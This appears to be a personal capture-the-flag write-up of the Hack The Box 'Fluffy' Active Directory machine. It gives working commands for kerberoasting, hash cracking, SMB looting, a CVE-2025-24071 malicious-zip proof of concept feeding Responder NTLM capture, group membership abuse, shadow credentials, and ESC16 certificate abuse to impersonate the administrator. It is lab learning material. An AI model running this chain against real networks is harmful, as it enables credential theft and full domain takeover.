## Checking if we have access using nxc
![[Pasted image 20260903204329.png]]'
we do!

**Lets try kerberoasting as well**
```python
nxc ldap dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' --kerberoasting output.txt
## we'll get an error because we have clock skew. do the following to sync times
sudo ntpdate fluffy.htb
```
 Output:
 ```python
 ✔ $ cat kerberoasting-output.txt                   
$krb5tgs$23$*ca_svc$FLUFFY.HTB$fluffy.htb\ca_svc*$3c5e4d9b3a8e2a2871b18dc53d103aa0$
$krb5tgs$23$*ldap_svc$FLUFFY.HTB$fluffy.htb\ldap_svc*$70973f1e1555817849b0fe33ffc44f8a$
$krb5tgs$23$*winrm_svc$FLUFFY.HTB$fluffy.htb\winrm_svc*$67198381fe7596d6e364e9bd77e397fb$

 ```
#### Lets crack those hashes using hashcat
```python
hashcat -m 13100 hashes.krb /usr/share/wordlists/rockyou.txt
#moved hashes.krb is exactly the same as the output we got from kerberoasting using nxc
#Failed to crack any hashes
```

## Shares enumeration
```python
nxc smb dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' --shares
```

### Downloading all the files from the IT share using smbclient
```python
✔ $ smbclient //10.129.232.88/IT -U 'fluffy.htb\j.fleischman'
Password for [FLUFFY.HTB\j.fleischman]:
Try "help" to get a list of possible commands.
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```
![[Pasted image 20260904052044.png]]

- Upon inspection of the "Upgrade_Notice.pdf" file, we determined that the machine is vulnerable to these CVE's:
  ![[Pasted image 20260904052245.png]]
- After a bit of research, we got to know that we have an exploit for `CVE-2025-24071`
- [POC link](https://github.com/0x6rss/CVE-2025-24071_PoC.git)
```python
✔ $ python poc.py
Enter your file name: malware.zip
Enter IP (EX: 192.168.1.162): 10.10.17.210
completed
```
**And then upload this zip file using our smb session (remeber, we had write access on the IT share)**
```python
smbclient //10.129.232.88/IT -U 'fluffy.htb\j.fleischman'
put malware.zip
```

**Before uploading the malware, make sure to run responder, so that it  will log the NTLM hashes of any users who access that file

## Responder
```python
✔ $ responder -I tun0
```

- we got the hash of the user `p.agila`, lets store it as a hash file and then crack it using hashcat

```python
p.agila:prometheusx-303
```

**Then we used bloodhound and found that we have generic all writes over a `service accounts`

### Use bloodyAD to add p.agila to that group
```python
bloodyad --host dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' -d 'fluffy.htb' add groupMember 'service accounts' 'p.agila
```

**And from the bloodhound output we know that these group members had "Generic write" permissions over 3 accounts
![[Pasted image 20260904060625.png]]

```python
certipy shadow auto -u 'p.agila@fluffy.htb' -p prometheusx-303 -account winrm_svc -dc-ip 10.129.232.88
```

### From the hints provided , we know that we need to enumerate the AD Certificate services (AD CS) environment 
- we did that using `ca_svc` hash.
- we can use certiy to show certificate templates/CA configurations that are vulnerable to known AD CS misconfigurations
```python
certipy-ad find -username ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8  -dc-ip 10.129.57.61 -vulnerable
```

**So we have ESC 16 vulnerability because the security Extension is disabled**
- what we have to do first is update the user principle name for an account 
- checking the current user principle name with certipy
```python
certipy account -u p.agila -p 'prometheusx-303' -dc-ip 10.129.57.61 -user ca_svc read
```

```python
└──╼ [★]$ certipy-ad account -u p.agila -p 'prometheusx-303' -dc-ip 10.129.57.61 -user ca_svc read
```

- The current userPrincipalName is `ca_svc@fluffy.htb`

**Use certipy to modify the UserPrincipalName (UPN) for `ca_svc`**
```python
certipy-ad account -u p.agila -p 'prometheusx-303' -dc-ip 10.129.57.61 -user ca_svc -upn administrator update

#IF you are trying to change the UPN to an already existing account, you might get an error, to fix that try adding or removing the domain name with ther user account name
```

```python
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'

```

- Now we need to request the certificate
```python
certipy-ad req -u ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -ca FLUFFY-DC01-CA -template User -upn administrator -dc-ip  10.129.57.61
```


**Now we need to change the upn of `ca_svc` back to some other value before we try to authenticate with this certificate, we can do that again with certipy**

```python
certipy-ad account -u p.agila -p 'prometheusx-303' -dc-ip 10.129.57.61 -user ca_svc -upn ca_svc  update
```
